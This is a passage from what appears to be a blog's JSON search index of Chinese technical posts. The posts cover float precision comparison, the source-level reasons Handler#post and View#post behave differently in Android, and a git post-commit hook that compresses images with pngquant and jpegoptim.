(float)0.1; float f = (double)0.1; if(abs(e - f) &lt; 0.0001) cout &lt;&lt; \"e == f\" &lt;&lt; endl; else cout &lt;&lt; \"e != f\" &lt;&lt; endl; return 0;&#125; 程序运行结果如下： 从该例子可以看出，对于同一个小数，当用不同精度表示时，结果是不一样的，不能直接用等号比较大小。 寄存器与内存表示浮点数精度不同按照博文计算机中基本类型float值表示和大小比较问题的说法： 即使在精度相同的情况下，比较也可能会出问题。因为在运算过程中会将内存（或高速缓存）中的值加载到CPU浮点寄存器（80 bit扩展精度）中，然后再进入CPU浮点计算单元进行计算，计算结果写回浮点寄存器，然后写回内存（或高速缓存）。从内存到浮点寄存器，浮点数的精度会扩展，从浮点寄存器到内存，浮点数的精度会降低(精度扩展通常没问题，但如果精度降低了，很可能值会发生变化，出现截断)，而浮点运算的结果由于下面还要使用所以暂时保存在浮点寄存器中留待下次使用（没有及时写回内存，这是一种优化策略），从而导致数据并不是内存中和内存中的数据比较而是浮点寄存器中的值和内存中的值进行比较，而无论内存中是float类型还是double类型，其精度和浮点寄存器精度都不相同，从而导致比较结果是不相等。 详细的可参考维基百科条目Extended precision。 参考资料浅谈计算机中浮点数的表达方法（IEEE 754）计算机中基本类型float值表示和大小比较问题","categories":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/categories/杂项/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/tags/杂项/"}]},{"title":"源码详细解析Handler#Post和View#Post的UI效果差异原因","slug":"源码详细解析Handler-Post和View-Post的UI效果差异原因","date":"2018-09-03T12:05:15.000Z","updated":"2020-05-11T07:23:44.863Z","comments":true,"path":"2018/09/03/源码详细解析Handler-Post和View-Post的UI效果差异原因/","link":"","permalink":"https://superxlcr.github.io/2018/09/03/源码详细解析Handler-Post和View-Post的UI效果差异原因/","excerpt":"","text":"前言一般有些需求中，会出现需要我们在Activity启动中获取UI控件相关大小或者在界面绘制完成之后刷新数据我们都知道，在UI绘制完成之后执行相应的操作时机最好，不会阻塞主线程导致卡顿或者UI控件参数获取失败也许大家使用过或知道Handler(MainLooper)#Post和View#Post都是把Runnable封装成Message再push到主线程中的looper的MessageQueue中，会发现在Activity的生命周期中执行这两种方式效果不同，前者不满足我们的需求，而后者却能做到接下来，本文就从Activity启动流程以及UI刷新和绘制流程原理以及消息循环机制、同步障碍机制来剖析 下面是一个获取UI控件大小为例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071class MyActivity extends Activity &#123; ..... @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); myCustomView = findViewById(R.id.custom); Log.i(\"test\", \"onCreate init myCustomView width=\" + myCustomView.getWidth()); &#125; @Override protected void onResume() &#123; super.onResume(); Log.i(\"test\", \"Main onResume\"); new Handler().post(new Runnable() &#123; @Override public void run() &#123; Log.i(\"test\", \"onResume Handler post runnable button width=\" + myCustomView.getWidth()); &#125; &#125;); myCustomView.post(new Runnable() &#123; @Override public void run() &#123; Log.i(\"test\", \"onResume myCustomView post runnable button width=\" + myCustomView.getWidth()); &#125; &#125;); &#125; public class MyView extends View &#123; @Override public void layout(int l, int t, int r, int b) &#123; super.layout(l, t, r, b); Log.i(\"test\", \"myView layout\"); &#125; @Override protected void onAttachedToWindow() &#123; Log.i(\"test\", \"myView onAttachedToWindow with\" + getWidth()); try &#123; Object mAttachInfo = ReflectUtils.getDeclaredField(this, View.class, \"mAttachInfo\"); Log.i(\"test\", \"myView onAttachedToWindow mAttachInfo=null?\" + (mAttachInfo == null)); Object mRunQueue = ReflectUtils.getDeclaredField(this, View.class, \"mRunQueue\"); Log.i(\"test\", \"myView onAttachedToWindow mRunQueue=null?\" + (mRunQueue == null)); &#125; catch (Exception e) &#123; &#125; super.onAttachedToWindow(); &#125; @Override public boolean post(Runnable action) &#123; try &#123; Object mAttachInfo = ReflectUtils.getDeclaredField(this, View.class, \"mAttachInfo\"); Log.i(\"test\", \"myView post mAttachInfo=null?\" + (mAttachInfo == null)); &#125; catch (Exception e) &#123; &#125; return super.post(action); &#125; @Override protected void onDraw(Canvas canvas) &#123; super.onDraw(canvas); Log.i(\"test\", \"myView onDraw\"); &#125; &#125;&#125; 日志显示结果： 123456789onCreate init myCustomView width=0Main onResumemyView post mAttachInfo=null?trueonResume Handler post runnable button width=0myView onAttachedToWindow width=0myView onAttachedToWindow mAttachInfo=null?falsemyView layoutmyView onDrawonResume myCustomView post runnable button width=854 从日志中可以看出: 在Activity可交互之前的生命周期中UI直接操作是失效的，即使通过handler把UI操纵任务post到onResume生命周期之后，也依然获失效，日志可以看到此时UI界面都没有绘制 View#post会让runnable在该View完成了measure、layout、draw之后再执行，这个时候当然就可以获取到UI相关参数了 源码先看下两者的源码实现： handler#post 123456789101112131415161718192021public final boolean post(Runnable r) &#123; return sendMessageDelayed(getPostMessage(r), 0);&#125;public boolean sendMessageAtTime(Message msg, long uptimeMillis) &#123; MessageQueue queue = mQueue; if (queue == null) &#123; RuntimeException e = new RuntimeException(this + \" sendMessageAtTime() called with no mQueue\"); Log.w(\"Looper\", e.getMessage(), e); return false; &#125; return enqueueMessage(queue, msg, uptimeMillis);&#125;private boolean enqueueMessage(MessageQueue queue, Message msg, long uptimeMillis) &#123; msg.target = this; if (mAsynchronous) &#123; msg.setAsynchronous(true); &#125; return queue.enqueueMessage(msg, uptimeMillis);&#125; 代码简单，可以看到就是把runnable封装成Message然后加入当前Looper的MessageQueue队列中 再看下View#post 12345678910111213141516171819202122232425262728293031323334public boolean post(Runnable action) &#123; final AttachInfo attachInfo = mAttachInfo; // 先是尝试通过attachInfo.mHandler.post来实现，实际上就是用Handler.post和上述一样 if (attachInfo != null) &#123; return attachInfo.mHandler.post(action); &#125; // 若attachInfo == null时，维护一个mRunQueue队列，然后在dispatchAttachedToWindow通过mRunQueue.executeActions(info.mHandler)把action加入队列 getRunQueue().post(action); return true;&#125;void dispatchAttachedToWindow(AttachInfo info, int visibility) &#123; mAttachInfo = info; if (mOverlay != null) &#123; mOverlay.getOverlayView().dispatchAttachedToWindow(info, visibility); &#125; ... // Transfer all pending runnables. if (mRunQueue != null) &#123; mRunQueue.executeActions(info.mHandler); mRunQueue = null; &#125; performCollectViewAttributes(mAttachInfo, visibility); onAttachedToWindow(); ...&#125;private HandlerActionQueue getRunQueue() &#123; if (mRunQueue == null) &#123; mRunQueue = new HandlerActionQueue(); &#125; return mRunQueue;&#125; HandlerActionQueue.class 123456789101112// 实际也是通过handler来post到主线程public void executeActions(Handler handler) &#123; synchronized (this) &#123; final HandlerAction[] actions = mActions; for (int i = 0, count = mCount; i &lt; count; i++) &#123; final HandlerAction handlerAction = actions[i]; handler.postDelayed(handlerAction.action, handlerAction.delay); &#125; mActions = null; mCount = 0; &#125;&#125; 重点来了,通过源码调用发现最终都是通过handler#post方式来加入到主线程队列中，api调用一样为何效果不一样，下面就从如下几个知识点来分析： Activity生命周期启动流程 Message消息发送和执行原理机制 UI绘制刷新触发原理机制 MessageQueue同步障碍机制 Activity启动流程这个流程不清楚的，可以网上搜，一大堆。但这里讲的是，ApplicationThread收到AMS的scheduleLaunchActivity的Binder消息之后，所在的binder线程，会通过ActivityThread中的mH（Handler）来sendMessage 12345678910111213141516171819202122232425262728293031323334private class ApplicationThread extends ApplicationThreadNative &#123; @Override public final void scheduleLaunchActivity(Intent intent, IBinder token, int ident, ActivityInfo info, Configuration curConfig, Configuration overrideConfig, CompatibilityInfo compatInfo, String referrer, IVoiceInteractor voiceInteractor, int procState, Bundle state, PersistableBundle persistentState, List&lt;ResultInfo&gt; pendingResults, List&lt;ReferrerIntent&gt; pendingNewIntents, boolean notResumed, boolean isForward, ProfilerInfo profilerInfo) &#123; updateProcessState(procState, false); ActivityClientRecord r = new ActivityClientRecord(); ... sendMessage(H.LAUNCH_ACTIVITY, r); &#125; private void sendMessage(int what, Object obj, int arg1, int arg2, boolean async) &#123; if (DEBUG_MESSAGES) Slog.v( TAG, \"SCHEDULE \" + what + \" \" + mH.codeToString(what) + \": \" + arg1 + \" / \" + obj); Message msg = Message.obtain(); msg.what = what; msg.obj = obj; msg.arg1 = arg1; msg.arg2 = arg2; if (async) &#123; msg.setAsynchronous(true); &#125; mH.sendMessage(msg); &#125;&#125; mH（Handler）会把这个异步消息加入到MainLooper中MessageQueue，等到执行时候回调handleLaunchActivity 12345678910public void handleMessage(Message msg) &#123; if (DEBUG_MESSAGES) Slog.v(TAG, \"&gt;&gt;&gt; handling: \" + codeToString(msg.what)); switch (msg.what) &#123; case LAUNCH_ACTIVITY: final ActivityClientRecord r = (ActivityClientRecord) msg.obj; r.packageInfo = getPackageInfoNoCheck(r.activityInfo.applicationInfo, r.compatInfo); handleLaunchActivity(r, null); Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); break; ... handleLaunchActivity方法会执行很多方法，这个是入口，简单来说会创建Activity对象，调用其启动生命周期，attach、onCreate、onStart、onResume，以及添加到WindowManager中，重点看下本文中onResume生命周期是如何回调的。在Activity可见之后，紧接着就是要触发绘制界面了，会走到handleResumeActivity方法，会在performResumeActivity中调用activity的onResume方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051final void handleResumeActivity(IBinder token, boolean clearHide, boolean isForward, boolean reallyResume) &#123; // 调用activity的onResume方法 ActivityClientRecord r = performResumeActivity(token, clearHide); ... if (r != null) &#123; final Activity a = r.activity; final int forwardBit = isForward ? WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION : 0; ... if (r.window == null &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) &#123; r.window = r.activity.getWindow(); View decor = r.window.getDecorView(); // decorView先暂时隐藏 decor.setVisibility(View.INVISIBLE); ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) &#123; a.mWindowAdded = true; // 关键函数 添加到window触发UI测量、布局、绘制 wm.addView(decor, l); &#125; ... r.activity.mVisibleFromServer = true; mNumVisibleActivities++; if (r.activity.mVisibleFromClient) &#123; // 添加decorView之后，设置可见，从而显示了activity的界面 r.activity.makeVisible(); &#125; &#125; &#125; &#125; public final ActivityClientRecord performResumeActivity(IBinder token, boolean clearHide) &#123; ActivityClientRecord r = mActivities.get(token); if (r != null &amp;&amp; !r.activity.mFinished) &#123; ... try &#123; r.activity.onStateNotSaved(); r.activity.mFragments.noteStateNotSaved(); // 调用activity的onResume方法 r.activity.performResume(); ... &#125; catch (Exception e) &#123; ... &#125; &#125; return r; &#125; 由此可见：从handleResumeActivity执行流程来看，到onResume调用的时候，Activity中的UI界面并没有经过measure、layout、draw等流程，所以直接在onResume或者之前的onCreate中执行UI操纵都是无用的，因为这个时候UI界面是不可见的，并没有进行绘制那为何通过hander#post让UI操作执行发生在handleLaunchActivity这个Message之后，还是不行呢？Message消息发送和执行原理机制这里就不阐述了，hander#post能让执行发生在handleLaunchActivity这个Message之后，就是因为这个Message循环机制原理，可以让任务通常依据Message加入的先后顺序依次执行，所以我们在onResume中push的Message，就会在handleLaunchActivity这个Message之后执行但是为何onResume中使用hander#post还不能UI操作呢，我们猜测其实handleLaunchActivity之后还没有同步完成UI绘制，那么我们接下来一起分析下UI绘制刷新触发原理机制 UI绘制刷新触发原理机制我们直接分析触发条件，从上文中的wm.addView开始：WindowManager会通过其子类WindowManagerImpl来实现，其内部又通过WindowManagerGlobal的单实例来实现addView方法，源码如下 WindowManagerGlobal.class 1234567891011121314151617181920public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) &#123; ... ViewRootImpl root; View panelParentView = null; ... // ViewRootImpl实际控制着整个UI操作流程 root = new ViewRootImpl(view.getContext(), display); view.setLayoutParams(wparams); mViews.add(view); mRoots.add(root); mParams.add(wparams); ... // do this last because it fires off messages to start doing things try &#123; // 绑定decorView，并触发开始绘制 root.setView(view, wparams, panelParentView); &#125; catch (RuntimeException e) &#123; &#125;&#125; 在addView中，我们调用了ViewRootImpl#setView，具体源码如下： ViewRootImpl.class 12345678910111213141516171819202122232425262728293031323334public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) &#123; synchronized (this) &#123; if (mView == null) &#123; mView = view; ... // 触发刷新绘制的关键 requestLayout(); if ((mWindowAttributes.inputFeatures &amp; WindowManager.LayoutParams.INPUT_FEATURE_NO_INPUT_CHANNEL) == 0) &#123; mInputChannel = new InputChannel(); &#125; ... try &#123; mOrigWindowType = mWindowAttributes.type; mAttachInfo.mRecomputeGlobalAttributes = true; collectViewAttributes(); // 通过binder call添加到Display res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mInputChannel); &#125; catch (RemoteException e) &#123; &#125; finally &#123; if (restore) &#123; attrs.restore(); &#125; &#125; ... // decorView添加父类ViewParent，其实就是ViewRootImpl view.assignParent(this); &#125; &#125;&#125; setView完成了上述几个重要步骤，我们来看看requestLayout的实现是如何触发刷新绘制的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586@Overridepublic void requestLayout() &#123; if (!mHandlingLayoutInLayoutRequest) &#123; checkThread(); mLayoutRequested = true; // 安排刷新请求 scheduleTraversals(); &#125;｝final TraversalRunnable mTraversalRunnable = new TraversalRunnable();final class TraversalRunnable implements Runnable &#123; @Override public void run() &#123; doTraversal(); &#125;&#125; void scheduleTraversals() &#123; // 一个刷新周期只执行一次即可，屏蔽其他的刷新请求 if (!mTraversalScheduled) &#123; mTraversalScheduled = true; // 设置同步障碍Message mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier(); // 屏幕刷新信号VSYNC 监听回调把mTraversalRunnable（执行doTraversal()） push到主线程，它是个异步Message会优先得到执行，具体看下Choreographer的实现 mChoreographer.postCallback(Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, null); if (!mUnbufferedInputDispatch) &#123; scheduleConsumeBatchedInput(); &#125; notifyRendererOfFramePending(); pokeDrawLockIfNeeded(); &#125;&#125;void doTraversal() &#123; if (mTraversalScheduled) &#123; mTraversalScheduled = false; // 移除同步障碍Message mHandler.getLooper().getQueue().removeSyncBarrier(mTraversalBarrier); if (mProfile) &#123; Debug.startMethodTracing(\"ViewAncestor\"); &#125; // 真正执行decorView的绘制 performTraversals(); if (mProfile) &#123; Debug.stopMethodTracing(); mProfile = false; &#125; &#125;&#125;private void performTraversals() &#123; // cache mView since it is used so much below... final View host = mView; ... Rect frame = mWinFrame; if (mFirst) &#123; mFullRedrawNeeded = true; mLayoutRequested = true; ... mAttachInfo.mUse32BitDrawingCache = true; mAttachInfo.mHasWindowFocus = false; mAttachInfo.mWindowVisibility = viewVisibility; mAttachInfo.mRecomputeGlobalAttributes = false; // performTraversals 第一次调用时候decorView dispatch mAttachInfo变量 host.dispatchAttachedToWindow(mAttachInfo, 0); mAttachInfo.mTreeObserver.dispatchOnWindowAttachedChange(true); dispatchApplyInsets(host); desiredWindowWidth = frame.width(); desiredWindowHeight = frame.height(); if (desiredWindowWidth != mWidth || desiredWindowHeight != mHeight) &#123; if (DEBUG_ORIENTATION) Log.v(TAG, \"View \" + host + \" resized to: \" + frame); mFullRedrawNeeded = true; mLayoutRequested = true; windowSizeMayChange = true; &#125; &#125; ... // 会根据状态判断是否执行，对mView(decorView)执行view的测量、布局、绘制 perforMeasure() perforLayout() perforDraw() mFirst=false;&#125; 从上述代码可以发现在addView之后同步执行到requestLayout，再到scheduleTraversals中设置了同步障碍消息这是个简单的阐述，我们来看下源码实现： MessageQueue.class 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859private int postSyncBarrier(long when) &#123; synchronized (this) &#123; final int token = mNextBarrierToken++; final Message msg = Message.obtain(); msg.markInUse(); msg.when = when; msg.arg1 = token; Message prev = null; Message p = mMessages; if (when != 0) &#123; while (p != null &amp;&amp; p.when &lt;= when) &#123; prev = p; p = p.next; &#125; &#125; if (prev != null) &#123; // invariant: p == prev.next msg.next = p; prev.next = msg; &#125; else &#123; msg.next = p; mMessages = msg; &#125; return token; &#125;&#125;// 根据token移动这个Messagepublic void removeSyncBarrier(int token) &#123; // Remove a sync barrier token from the queue. // If the queue is no longer stalled by a barrier then wake it. synchronized (this) &#123; Message prev = null; Message p = mMessages; while (p != null &amp;&amp; (p.target != null || p.arg1 != token)) &#123; prev = p; p = p.next; &#125; if (p == null) &#123; throw new IllegalStateException(\"The specified message queue synchronization \" + \" barrier token has not been posted or has already been removed.\"); &#125; final boolean needWake; if (prev != null) &#123; prev.next = p.next; needWake = false; &#125; else &#123; mMessages = p.next; needWake = mMessages == null || mMessages.target != null; &#125; p.recycleUnchecked(); // If the loop is quitting then it is already awake. // We can assume mPtr != 0 when mQuitting is false. if (needWake &amp;&amp; !mQuitting) &#123; nativeWake(mPtr); &#125; &#125;&#125; MessageQueue同步障碍机制： 可以发现就是把一条Message（注意这个Message是没有设置target的）直接手动循环移动链表插入到合适time的Message之后的即可然后消息队列是如何识别这个障碍消息的呢，我们可以看下Looper#loop循环中获取MessageQueue#next获取下一个message是如何实现的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Message next() &#123; final long ptr = mPtr; if (ptr == 0) &#123; return null; &#125; int pendingIdleHandlerCount = -1; // -1 only during first iteration int nextPollTimeoutMillis = 0; for (;;) &#123; if (nextPollTimeoutMillis != 0) &#123; Binder.flushPendingCommands(); &#125; // 查询是否有下一个消息，没有就阻塞 nativePollOnce(ptr, nextPollTimeoutMillis); synchronized (this) &#123; final long now = SystemClock.uptimeMillis(); Message prevMsg = null; Message msg = mMessages; // 关键地方，首先识别 msg.target == null情况就是同步障碍消息，如果该消息是同步障碍消息的话，就会循环查询下一个消息是否是isAsynchronous状态，异步Message，专门给刷新UI消息使用的 if (msg != null &amp;&amp; msg.target == null) &#123; // Stalled by a barrier. Find the next asynchronous message in the queue. do &#123; prevMsg = msg; msg = msg.next; &#125; while (msg != null &amp;&amp; !msg.isAsynchronous()); &#125; // 如果查到异步消息或者没有设置同步障碍的消息，直接返回执行 if (msg != null) &#123; if (now &lt; msg.when) &#123; // Next message is not ready. Set a timeout to wake up when it is ready. nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); &#125; else &#123; // Got a message. mBlocked = false; if (prevMsg != null) &#123; prevMsg.next = msg.next; &#125; else &#123; mMessages = msg.next; &#125; msg.next = null; if (DEBUG) Log.v(TAG, \"Returning message: \" + msg); msg.markInUse(); return msg; &#125; &#125; else &#123; // No more messages. nextPollTimeoutMillis = -1; &#125; &#125; ... nextPollTimeoutMillis = 0; &#125;&#125; 可以看到scheduleTraversals中设置了同步障碍消息，就是相当于在MessageQueue中插入了一个Message，并且是在onResume之后插入的，所以在onResume中使用handler#post加入的消息会在同步障碍Message之前，会先被执行，这个时候依然没有刷新绘制界面，所以在onResume中handler#post发送的消息中进行UI操作是失效的待消息队列查询到同步障碍Message时候，会等待下个异步Message（刷新Message）出现那么为何View#post就可以了呢，再回过头来看下其源码： View.class 1234567891011public boolean post(Runnable action) &#123; final AttachInfo attachInfo = mAttachInfo; if (attachInfo != null) &#123; return attachInfo.mHandler.post(action); &#125; // Postpone the runnable until we know on which thread it needs to run. // Assume that the runnable will be successfully placed after attach. getRunQueue().post(action); return true;&#125; 由于在onResume中执行，这个时候ViewRootImpl还没有初始化（在WindowManager#addView中才初始化），而mAttachInfo是在ViewRootImpl构造函数中初始化的，此时mAttachInfo == null从上文我们知道，此时的消息都被添加进了View里面的mRunQueue队列中然后在dispatchAttachedToWindow中，我们通过mRunQueue.executeActions(info.mHandler)这段代码，把mRunQueue中任务全部push到主线程中那这个方法dispatchAttachedToWindow什么会被调用，回顾上文中ViewRootImpl第一次收到Vsync同步刷新信号之后会执行performTraversals，这个函数内部做了个判断，当第一次mFirst时候会调用 1host.dispatchAttachedToWindow(mAttachInfo, 0); 然后把全局mAttachInfo下发给所有子View，其源码如下： View.class 12345678910111213141516171819void dispatchAttachedToWindow(AttachInfo info, int visibility) &#123; mAttachInfo = info; if (mOverlay != null) &#123; // 向下分发info,其实现在ViewGroup中 mOverlay.getOverlayView().dispatchAttachedToWindow(info, visibility); &#125; mWindowAttachCount++; // We will need to evaluate the drawable state at least once ... // Transfer all pending runnables. if (mRunQueue != null) &#123; mRunQueue.executeActions(info.mHandler); mRunQueue = null; &#125; performCollectViewAttributes(mAttachInfo, visibility); onAttachedToWindow(); ...&#125; 可以看到这个函数同时执行了 1mRunQueue.executeActions(info.mHandler); 从上文可知就是通过hander把mRunQueue中任务全部push到主线程中。由此可以知道在performTraversals中push Message到主线中，肯定会这个performTraversals之后再执行，并且在doTraversals中移除了同步障碍消息，故会依次执行。所以onResume中View.post的Message就会在performTraversals之后执行，而performTraversals就是完成了View整个测量、布局和绘制另外，当View的mAttachInfo != null时消息是直接post到主线程中的，但因为mAttachInfo不为空，也说明了肯定完成过UI绘制 总结本文主要通过四个知识点，分析了Handler#Post和View#Post的UI效果差异原因说明了为何Handler#Post无法保证在UI绘制后执行，而View#Post却可以 Activity生命周期启动流程 Message消息发送和执行原理机制 UI绘制刷新触发原理机制 MessageQueue同步障碍机制","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"git提交图片后自动压缩","slug":"git提交图片后自动压缩","date":"2018-08-09T12:07:42.000Z","updated":"2020-05-11T07:23:44.771Z","comments":true,"path":"2018/08/09/git提交图片后自动压缩/","link":"","permalink":"https://superxlcr.github.io/2018/08/09/git提交图片后自动压缩/","excerpt":"","text":"前言一般而言，当我们做需求需要在项目中加入图片时，都会去tinyPng上进行图片压缩tinyPng使用的是有损压缩的方法，支持png与jpg格式，压缩完的图片看起来不会产生太大的差别，但每次需求的图片感觉都能压缩几百k的样子虽然Android Studio编译出来的release版本apk本来就会对资源文件进行压缩，但我们把原图压缩一遍再去提交还是能节省不少大小考虑到每次提交图片文件前都需要去打开网页进行压缩比较繁琐，因此博主考虑使用git hook来编写一套自动压缩工具 压缩工具压缩图片网站api最开始，博主考虑的是使用图片压缩网站提供的api来实现图片压缩，如tinyPng的api然而，这些网站提供的api不仅有使用次数限制（tinyPng是每个月500张，多出的要收钱），而且每次压缩需要调用http请求也显得很繁琐因此，博主对比后决定寻找本地的压缩工具在对比过多个图片工具后，博主决定使用pngquant来压缩png图片，使用jpegoptim来压缩jpg图片 pngquant这款png压缩工具做的比较友好，它支持png图片的有损压缩，我们可以通过下面的参数来更改压缩出来图片的最小与最大质量： 1--quality=min_quality-max_quality 更多的命令请参考github或官网同时，在不同的平台上运行我们并不需要自己去编译代码，在官网上进行下载即可：https://pngquant.org/ jpegoptim这款jpg压缩工具也支持有损压缩，同样也可以通过参数指定压缩图片的最大质量： 1-mmax_quality 不过这款工具比较麻烦的地方在于它的并没有给出编译好的版本，我们只能在要使用到的平台上自行编译一次 在windows平台上编译jpegoptim以下记录一下博主在windows平台上编译的辛酸史不同于Linux以及Mac，在windos上配置环境、编译库等步骤比较麻烦，这里按照issues上倒数第二个回答的指示，一步步完成jpegoptim的编译工作：https://github.com/tjko/jpegoptim/issues/18 首先，我们需要安装相应的编译工具：mingw（Minimalist GNU for Windows），针对Windows的迷你GNU工具集合：http://www.mingw.org/使用MinGW Installer安装C++的编译环境，把Basic Setup里面的都装了： 由于编译jpegoptim需要libjpeg库，我们需要去下载mozjpeg：https://github.com/mozilla/mozjpeg/releases 使用mingw安装目录下的MinGW\\msys\\1.0\\msys.bat启动命令行，执行mozjpeg下的configure文件生成makefile： 1./configure --host=i686-w64-mingw32 然后使用make命令进行编译 下载jpegoptim源码，执行configure文件生成makefile： 1CPPFLAGS=-I../mozjpeg LDFLAGS=-L../mozjpeg/.libs ./configure --host=i686-w64-mingw32 然后使用make命令进行编译，不过这样编译出来的执行文件需要依赖动态链接库才能运行 通过执行以下命令重新进行编译，使得编译出来的jpegoptim不再依赖动态链接库： 1i686-w64-mingw32-gcc -g -O2 -I../mozjpeg -DHAVE_CONFIG_H -o jpegoptim jpegoptim.o jpegdest.o misc.o -L../mozjpeg/.libs -lm ../mozjpeg/.libs/libjpeg.a 至此，我们终于得到一个编译好的jpegoptim执行程序了 git hookgit hook 的介绍网站：https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9 git hook 允许我们在一些特定的行为后执行自动的脚本这里我们使用post-commit，在一次commit提交后找出该次commit提交包含的png以及jpg文件，本地进行压缩后新增一次commit进行提交git hook 的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#!/bin/sh# version 1.4hook_tools_dir=\"picCompressGitHook/\"hook_commit_message=\"[#0]this commit is to compress picture by post-commit hook\"# if true, that means recently commit is by post-commit hook, just exitif [ \"$(git log -1 HEAD --pretty=\"%s\")\" = \"$hook_commit_message\" ]then exit 0fi# this is copy from sampleif git rev-parse --verify HEAD &gt;/dev/null 2&gt;&amp;1then against=HEAD~1else # Initial commit: diff against an empty tree object against=4b825dc642cb6eb9a060e54bf8d69288fbee4904fi# check the switchno_compress_pic=$(git config --bool hooks.nocompresspic)if [ \"$no_compress_pic\" = \"true\" ]then echo \"no compress pic after commit\" exit 0ficlose_hint=\"if you want to disable pic compress, you can disable switch : \\ngit config hooks.nocompresspic true\"max_quality=100min_quality=80png_suffix=\"-compress.png\"# get pic to compressdiff_item_array=($(git diff $against --name-only --diff-filter=AM HEAD))pic_array=()counter=0for diff_item in $&#123;diff_item_array[@]&#125;do if [ $(expr match \"$diff_item\" \".*\\.[p|j][n|p]g$\") -gt 0 ] then pic_array[counter]=$diff_item let counter++ fidone# check have pic to compress and compress toolsif [ ! $&#123;#pic_array[@]&#125; -gt 0 ]then echo \"this commit don't have pic to compress, just exit\" exit 0elif [ ! -f $hook_tools_dir\"pngquant-windows\" ] || [ ! -f $hook_tools_dir\"jpegoptim-windows\" ] # pwd is root project dirthen echo \"stop compress pic !\" echo \"you don't have pngquant-windows and jpegoptim-windows in the $(pwd)/$hook_tools_dir dir !\" echo -e $close_hint exit 0fi# check whether need to stash old uncommit fileworking_file_array=$(git diff --name-only)cached_file_array=$(git diff --cached --name-only)git_need_stash_pop=0need_stash_file_count=0for item in $&#123;working_file_array[@]&#125;do let need_stash_file_count++donefor item in $&#123;cached_file_array[@]&#125;do let need_stash_file_count++doneif [ $need_stash_file_count -gt 0 ]then echo \"there are $$need_stash_file_count files not added to commit, do git stash\" git stash git_need_stash_pop=1fi# compress picecho \"there is $&#123;#pic_array[@]&#125; pic going to compress\"echo -e \"\\n###################################################\\n\"compress_success=0for pic in $&#123;pic_array[@]&#125;do if [ $(expr match \"$pic\" \".*\\.png$\") -gt 0 ] then # png png_compress=$&#123;pic%\\.*&#125;$png_suffix \"./\"$hook_tools_dir\"pngquant-windows\" --skip-if-larger --ext $png_suffix --quality $min_quality-$max_quality -f --strip $pic &gt;/dev/null 2&gt;&amp;1 if [ -f $png_compress ] then mv -f $png_compress $pic echo \"compress png pic : $&#123;pic##*/&#125; success\" compress_success=1 else echo \"compress png pic : $&#123;pic##*/&#125; fail\" fi else # jpg \"./\"$hook_tools_dir\"jpegoptim-windows\" -m$max_quality -o --all-normal $pic &gt;/dev/null 2&gt;&amp;1 echo \"compress jpg pic : $&#123;pic##*/&#125; finish\" compress_success=1 fidoneecho -e \"\\n###################################################\\n\"# do commitif [ $compress_success == 1 ]then echo \"some compress success , do commit !\" git add . git commit -m \"$hook_commit_message\"else echo \"no pic compress success, abort commit !\"fi# stash pop old fileif [ $git_need_stash_pop == 1 ]then echo \"do git stash pop to get old files\" git stash popfi 目前由于博主只编译了windows的pngquant以及jpegoptim压缩工具，因此在git hook 中只处理了pngquant-windows以及jpegoptim-windows两款工具，并没有处理不同平台的逻辑 git hook 安装工具由于git是默认不追踪本地的git hook的，为了存放压缩工具、方便组内的童鞋使用以及日后的git hook脚本更新，博主新建了一个picCompressGitHook文件夹，往其中放入了： jpegoptim-windows：windows环境编译的jpegoptim pngquant-windows：windows环境编译的pngquant post-commit：git hook 脚本 install.sh：安装脚本，调用即可复制git hook 安装脚本的代码如下： 12345#!/bin/shchmod a+x pngquant-windowschmod a+x jpegoptim-windowscp -f post-commit ../.git/hooks/post-commit 使用了自动压缩图片的git hook之后，提交了图片会自动压缩，再也不用自己打开网页去压缩图片了！","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"不可思议的OOM","slug":"不可思议的OOM","date":"2018-07-22T10:06:04.000Z","updated":"2020-05-11T07:23:44.794Z","comments":true,"path":"2018/07/22/不可思议的OOM/","link":"","permalink":"https://superxlcr.github.io/2018/07/22/不可思议的OOM/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/e574f0ffdb42 